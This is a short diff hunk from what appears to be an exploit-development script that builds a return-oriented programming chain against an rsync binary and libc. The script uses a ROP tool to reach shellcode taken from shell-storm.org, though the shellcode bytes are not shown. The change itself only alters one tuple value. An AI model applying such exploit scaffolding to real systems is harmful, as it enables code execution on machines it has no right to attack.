@@ -17,7 +17,7 @@ shellcode = ( # http://shell-storm.org/shellcode/files/shellcode-603.php
 )
 
 filename = './rsync'
-files = [(filename, './rsync.gadgets', 0)]
+files = [(filename, './rsync.gadgets', None)]
 goals = [["shellcode_hex", binascii.hexlify(shellcode)]]
 rop = ropme.rop(files, ["/lib/x86_64-linux-gnu/libc.so.6"], goals)
 
